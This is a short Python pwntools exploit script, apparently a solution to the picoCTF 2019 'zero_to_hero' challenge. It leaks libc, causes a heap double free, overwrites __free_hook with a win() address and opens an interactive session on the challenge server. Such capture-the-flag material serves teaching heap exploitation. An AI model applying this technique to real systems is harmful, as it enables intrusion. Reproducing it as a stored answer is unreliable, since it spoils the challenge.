# This is the full exploit
from pwn import *
import time

# p = process('./zero_to_hero', env={"LD_PRELOAD": "libc.so.6"})
p = remote('2019shell1.picoctf.com',45180)

# Standard helper functions
def wait():
    time.sleep(0.15)
def flush():
    return p.recv(4096)

def create(s, l):
    p.sendline('1')
    p.sendline(str(l))
    p.sendline(s)
    wait()
def remove(n):
    p.sendline('2')
    p.sendline(str(n))
    wait()

p.sendline('yes')
wait()

data = p.recv(4096)
# print data --- they give libc for free
SYSTEM = int(data.split('\n')[4][39:], 16)
LIBC_BASE = SYSTEM - 0x2C550
MALLOC_HOOK = LIBC_BASE + 0x72380

# at 0x1e3ef8 in file
FREE_HOOK = LIBC_BASE + 0x1C0B28
print "== LEAKED LIBC: {} ==".format(hex(LIBC_BASE))

raw_input("[begin exploit]")

raw_input("[malloc chunk A, size 0x30]")
create("AAAA", 40)
raw_input("[malloc chunk B, size 0x110]")
create("BBBB", 264)

raw_input("[free chunk B]")
remove(1)

raw_input("[free chunk A; we will get it later so we can write to it again]")
remove(0)
raw_input("[malloc (again) chunk A with len = 40; overwrite chunk B]")
create("aaaabbbbccccddddeeeeffffgggghhhhiiiijjjj", 40)

raw_input("[free chunk B again (double free)]")
remove(1)

p.recv(4096)

inp = raw_input("[malloc chunk of size 0x100]")
create(p64(FREE_HOOK), 248)

raw_input("[malloc the same chunk of size 0x110]")
create("1111222233334444", 264)

raw_input("[malloc for arbitrary write]")
# 0x400a02 is the location of win()
create(p64(0x400a02), 264)

raw_input("[win]")
remove(0)

p.interactive()
